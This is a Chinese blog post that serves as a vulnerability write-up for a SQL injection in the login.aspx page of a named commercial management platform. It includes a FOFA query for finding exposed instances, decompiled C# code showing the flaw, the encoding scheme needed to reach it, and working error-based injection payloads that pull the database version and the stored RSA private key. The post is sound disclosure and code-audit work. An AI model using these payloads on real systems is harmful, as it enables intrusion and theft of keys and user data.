---
title: "银达汇智智慧综合管理平台 login.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/windor-login-username-sqli.html
asset_dir: assets/银达汇智智慧综合管理平台-login.aspx-sql注入漏洞
---

# 银达汇智智慧综合管理平台 login.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/7 18:23
- 913浏览
- [0评论](#comment)
- 47分钟阅读

深入探索

Web安全课程

网络安全会议

JSON处理工具

---

# 漏洞简介

福建银达汇智信息科技股份有限公司成立于2009年，位于福建省福州市，是一家以从事[软件](#)和信息技术服务业为主的企业。银达汇智智慧综合管理平台 login.aspx 存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# fofa语法

> `title="智慧综合管理平台登入"`

# 漏洞分析

直接看 login.aspx 的业务逻辑实现不管关键代码

```
protected void Page_Load(object sender, EventArgs e)
{
  Login.loginfo.Info((object) nameof (Page_Load));
  string str1 = this.Request.QueryString["action"];
  string verifyStr = this.Request.QueryString["ediStr"];
  if (!this.IsPostBack)
    RSAHelper.InitKeys(0);
  this.IsValidateCode = ConfigurationManager.AppSettings["IsValidateCode"];
  if (string.IsNullOrEmpty(this.IsValidateCode))
    this.IsValidateCode = "1";
  this.rsa.InitCrypto();
  this.param = this.rsa.ExportParameters(true);
  if (string.op_Equality(str1, "login"))
  {
    string hex1 = WRequest.GetString("username");
    string hex2 = WRequest.GetString("pwd");
    string hex3 = WRequest.GetString("validate");
    string base64_1 = RSAHelper.ASCIIBytesToString(this.rsa.Decrypt(RSAHelper.HexStringToBytes(hex1)));
    string base64_2 = RSAHelper.ASCIIBytesToString(this.rsa.Decrypt(RSAHelper.HexStringToBytes(hex2)));
    string str2 = RSAHelper.ASCIIBytesToString(this.rsa.Decrypt(RSAHelper.HexStringToBytes(hex3)));
    string user_name = RSAHelper.GB2312BytesToString(RSAHelper.FromBase64(base64_1));
    string pwd = RSAHelper.GB2312BytesToString(RSAHelper.FromBase64(base64_2));
    string[] strArray = str2.Split(new char[1]{ '\\' });
    if (strArray.Length != 3)
    {
      this.Response.Write(SystemHelper.WriteResult("error", "验证出错！"));
      this.Response.End();
    }
    if (string.op_Equality(this.IsValidateCode, "1"))
    {
      if (string.op_Inequality(user_name, RSAHelper.GB2312BytesToString(RSAHelper.FromBase64(strArray[0]))) || string.op_Inequality(pwd, RSAHelper.GB2312BytesToString(RSAHelper.FromBase64(strArray[1]))) || string.op_Inequality(Convert.ToString(this.Session["ValidateCode"]).ToUpper(), RSAHelper.GB2312BytesToString(RSAHelper.FromBase64(strArray[2])).ToUpper()))
      {
        this.Session["ValidateCode"] = (object) "";
        this.Response.Write(SystemHelper.WriteResult("error", "验证出错！"));
        this.Response.End();
      }
    }
    else if (string.op_Inequality(user_name, RSAHelper.GB2312BytesToString(RSAHelper.FromBase64(strArray[0]))) || string.op_Inequality(pwd, RSAHelper.GB2312BytesToString(RSAHelper.FromBase64(strArray[1]))))
    {
      this.Session["ValidateCode"] = (object) "";
      this.Response.Write(SystemHelper.WriteResult("error", "验证出错！"));
      this.Response.End();
    }
    this.GetUser(user_name, pwd, "");
  }
```

上述处理逻辑大致如下图所示

代码安全审计

[![银达汇智智慧综合管理平台 login.aspx SQL注入漏洞](images/img-001-aadb7be2c29b.webp)](https://image.mrxn.net/1ed6e1d6f457409db586601d89233152.webp)

对传入进来的 validate 内容进行 hex解码后使用 rsa 解密还原成 base64内容，再根据 反斜杠 `\` 进行分割成数组，如果不满足 3 个数组，则输出验证出错。然后根据配置文件里是否启用验证码，如果启用则判断三个数组里的内容是否分别和输入的用户名、密码、验证码是否相等。如果没有启用验证码则只比较用户名和密码是否和输入的用户名、密码相等。都校验通过后进入 GetUser 函数，其业务逻辑实现如下

漏洞修复方案

```
public void GetUser(string user_name, string pwd, string LoginIP)
    {
      if (string.op_Equality(this.IsValidateCode, "0") || string.op_Equality(Convert.ToString(this.Session["ValidateCode"]).ToUpper(), WRequest.GetString("validateCode").ToUpper()))
      {
        SysUserDao sysUserDao = new SysUserDao();
        SysUser model1 = sysUserDao.GetItem(string.Format("(account='{0}' OR id_card='{0}') ", (object) user_name));
        if (model1 != null)
```

user\_name 直接拼接进SQL语句中执行，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

登录业务涉及到RSA加解密以及hex、base64编解码操作

username、pwd均都是经过base64-->rsa 加密后转为 hex 再提交

validateCode 为验证码

而 validate 由 base64 编码后的 user\_name + "\" + base64 编码后的 pwd + "\" + base64 编码后的 validateCode 整体再进行ras加密后转为hex

物流软件安全

只是在加密处理 validate 时需要注意,总体加密流程如下

hex(rsa(base64(user\_name)\base64(pwd)\base64(validateCode)))

# 漏洞复现

使用 `admin')and 1=@@version--` 的 username 进行报错注入测试

[![银达汇智智慧综合管理平台 login.aspx SQL注入漏洞](images/img-002-5f34f880e22f.webp)](https://image.mrxn.net/c749f77404ab406fab04fc9f52cc8e3c.webp)

成功通过报错注入，爆出数据版本信息。

编程

还可以获得 rsa 公私钥（存放在数据库里）

```
public void InitCrypto()
{
  this._sp = new RSACryptoServiceProvider(new CspParameters()
  {
    Flags = (CspProviderFlags) 1
  });
  ((AsymmetricAlgorithm) this._sp).FromXmlString(new SysRsaParamDao().GetItem(1L).PrivateKey);
}
```

```
namespace KR.Dao
{
  [Serializable]
  public class SysRsaParamDao : BaseProvider<SysRsaParam>
  {
    public DataTable GetDataTabelToExcel(int top, string condition)
    {
      if (string.IsNullOrWhiteSpace(condition))
        condition = " 1=1 ";
      string sql = string.Format("select top {0} id as id, PrivateKey as 私钥, PublicKey as 公钥, org_id as 企业id from sys_rsa_param where {1}", (object) top, (object) condition);
      return DbHelperFactory.GetDbHelper().Query(sql).Tables[0];
    }
  }
}
```

```
admin')and 1=(select top 1 PrivateKey from sys_rsa_param)--
admin')and 1=(select top 1 PublicKey from sys_rsa_param)--
```

拿到公私钥后就可以随意加解密了，拿到的是xml格式的密钥，可参考 [.NET RSA 算法的 XML 格式简介及其转换 PEM 格式](https://mrxn.net/jswz/722.html) 这篇文章对其进行转换为 PEM 格式，方便调用其他工具进行加解密。

SQL注入防护

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
